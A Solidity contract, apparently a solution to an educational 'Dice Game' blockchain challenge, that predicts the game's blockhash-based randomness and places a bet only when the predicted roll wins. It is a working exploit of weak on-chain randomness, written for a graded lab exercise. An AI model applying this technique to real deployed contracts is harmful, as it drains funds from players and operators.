pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public payable {
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		console.log("\t", "   Dice Game Roll:", roll);

		if (roll == 0 || roll == 1 || roll == 2) {
			diceGame.rollTheDice{ value: 0.002 ether }();
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
